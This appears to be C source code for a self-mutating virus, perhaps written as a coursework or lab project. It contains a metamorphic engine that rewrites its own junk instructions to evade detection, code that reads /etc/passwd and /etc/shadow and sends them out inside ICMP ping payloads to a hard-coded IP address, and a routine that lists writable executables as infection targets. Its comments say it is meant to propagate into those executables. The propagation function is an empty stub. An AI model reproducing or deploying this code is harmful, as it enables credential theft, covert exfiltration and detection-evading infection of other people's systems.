#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <time.h>
#include <dirent.h>
#include <unistd.h>
#include <sys/stat.h>
#include <errno.h>

#define PUSH 0x50
#define POP 0x58
#define MOV 0xB8
#define NOP 0x90

#define ADD 0x01
#define AND 0x21
#define XOR 0x31
#define OR 0x09
#define SBB 0x19
#define SUB 0x29

const unsigned char prefixes[] = { ADD, AND, XOR, OR, SBB, SUB, 0 };

#define JUNK asm __volatile__(".byte 0x50, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x58\n");
#define JUNKLEN 8

unsigned char *code;
int codelen;

void readcode(const char *filename)
{
    /* Opens file, rb represents read and binary */
    FILE *fp = fopen(filename, "rb");   JUNK;
    /* Sets the file position of the stream to the given offset (0 long int) */
    fseek(fp, 0L, SEEK_END);            JUNK;
    /* Sets the length of the code  */
    codelen = ftell(fp);
    /* Allocates memory to the length of the code */
    code = malloc(codelen);             JUNK;
    /* Gets the file position of the stream to the start of the file */
    fseek(fp, 0L, SEEK_SET);
    /* Reads the file into the code variable in memory */
    fread(code, codelen, 1, fp);        JUNK;
}

void writecode(const char *filename)
{
    FILE *fp;
    int lastoffset = strlen(filename) - 1;
    /* Gets the last character of the fname to copy */
    char lastchar = filename[lastoffset];
    char *newfilename = strdup(filename);   JUNK;
    /* Sets last char to incremented number based on ASCII table values */
    lastchar = '0' + (isdigit(lastchar)?(lastchar-'0'+1)%10:0);
    /* Updates the last char of the fname */
    newfilename[lastoffset] = lastchar;
    /* Opens file with write to binary permissions */
    fp = fopen(newfilename, "wb");          JUNK;
    /* Writes the code variable into the file */
    fwrite(code, codelen, 1, fp);           JUNK;
    fclose(fp);
    /* Frees the variable from memory */
    free(newfilename);
}

int writeinstruction(unsigned reg, int offset, int space)
{
    if (space < 2)
    {
        code[offset] = NOP;                     JUNK;
        return 1;
    }
    else if (space < 5 || rand()%2 == 0)
    {
        code[offset] = prefixes[rand()%6];      JUNK;
        code[offset+1] = 0xC0 + rand()%8*8 + reg; JUNK;
        return 2;
    }
    else
    {
        code[offset] = MOV+reg;                 JUNK;
        *(short*)(code+offset+1) = rand();
        *(short*)(code+offset+3) = rand();      JUNK;
        return 5;
    }
}

int readinstruction(unsigned reg, int offset)
{
    unsigned c1 = code[offset];
    if (c1 == NOP)
    {
        return 1;                       JUNK;
    }
    if (c1 == MOV+reg)
    {
        return 5;                       JUNK;
    }
    if (strchr(prefixes, c1))
    {
        unsigned c2 = code[offset+1];   JUNK;
        if (c2 >= 0xC0 && c2 <= 0xFF && (c2&7) == reg)
        {
            return 2;                   JUNK;
        }                               JUNK;
        return 0;
    }
}

void replacejunk(void)
{
    int i, j, inc, space;
    srand(time(NULL));                                  JUNK;

    for (i=0; i < codelen-JUNKLEN-2; i++)
    {
        unsigned start = code[i];
        unsigned end = code[i+JUNKLEN+1];
        unsigned reg = start-PUSH;

        if (start < PUSH || start >= PUSH+8) continue;  JUNK;
        if (end != POP+reg) continue;                   JUNK;

        /* Register 4 is ESP (stack) */
        if (reg == 4) continue;

        j = 0;                                          JUNK;
        while (inc = readinstruction(reg, i+1+j)) j += inc;
        if (j != JUNKLEN) continue;                     JUNK;

        reg = rand()%7;                                 JUNK;
        reg += (reg >= 4);
        code[i] = PUSH + reg;                           JUNK;
        code[i+JUNKLEN+1] = POP + reg;                  JUNK;

        space = JUNKLEN;
        j = 0;                                          JUNK;
        while (space)
        {
            inc = writeinstruction(reg, i+1+j, space);  JUNK;
            j += inc;
            space -= inc;                               JUNK;
        }
        printf("%d\n", i);                              JUNK;
    }
}

char* read_file(const char *filename)
{
    unsigned char *str;
    int strlen;
    /* Opens file, rb represents read and binary */
    FILE *fp = fopen(filename, "r");   JUNK;
    /* Sets the file position of the stream to the given offset (0 long int) */
    fseek(fp, 0L, SEEK_END);            JUNK;
    /* Sets the length of the code  */
    strlen = ftell(fp);
    /* Allocates memory to the length of the code */
    str = malloc(strlen);             JUNK;
    /* Gets the file position of the stream to the start of the file */
    fseek(fp, 0L, SEEK_SET);
    /* Reads the file into the code variable in memory */
    fread(str, strlen, 1, fp);        JUNK;

    return str;
}

void send_ping(const char *cmd)
{
    system(cmd);
}

// Send /etc/passwd and /etc/shadow files in a ping
void execute()
{
    unsigned char *passwd;
    unsigned char *shadow;
    int passwd_len;
    int shadow_len;

    passwd = read_file("/etc/passwd");
    shadow = read_file("/etc/shadow");

    passwd_len = strlen(passwd);
    shadow_len = strlen(shadow);

    char *ping = "sudo nping -c 1 --icmp --data-string \"%s\" 192.168.1.142";
    int ping_len = strlen(ping);

    int passwd_cmd_len = ping_len + passwd_len + 1;
    int shadow_cmd_len = ping_len + shadow_len + 1;

    char passwd_cmd[passwd_cmd_len];
    char shadow_cmd[shadow_cmd_len];

    sprintf(passwd_cmd, ping, passwd);
    sprintf(shadow_cmd, ping, shadow);

    printf(passwd_cmd);
    printf(shadow_cmd);

    send_ping(passwd_cmd);
    send_ping(shadow_cmd);
}

// Propagate into executable files in hopes of being run as sudo
void propagate()
{

}

// Lists files in passed in directory path
void list_files(const char *path) {
DIR *dir;
    struct dirent *ent;

    /* Open directory stream */
    dir = opendir ("./");
    if (dir != NULL) {

        /* Print all files and directories within the directory */
        while ((ent = readdir (dir)) != NULL) {
            // regular files only - no DT_DIR (directories) or DT_LNK (links)
            if (ent->d_type == DT_REG)
            {
                printf("%s", ent->d_name);
                if (access(ent->d_name, X_OK) == 0 && access(ent->d_name, W_OK) == 0)
                {
                    printf(" - Writable Executable");
                }
                printf("\n");
            }
        }

        closedir (dir);

    } else {
        /* Could not open directory */
        fprintf (stderr, "Cannot open %s (%s)\n", "./", strerror (errno));
        exit (EXIT_FAILURE);
    }
}

// Should check before executing if root privelege
int main(int argc, char* argv[])
{
    system("id -u"); // outputs 0 if root user
    //execute("192.168.1.142"); // send ICMP ping with custom payload to IP
    list_files("./"); // list writable executable files for propagation

    //readcode(argv[0]);  JUNK;
    //replacejunk();      JUNK;
    //writecode(argv[0]); JUNK;

    return 0;
}
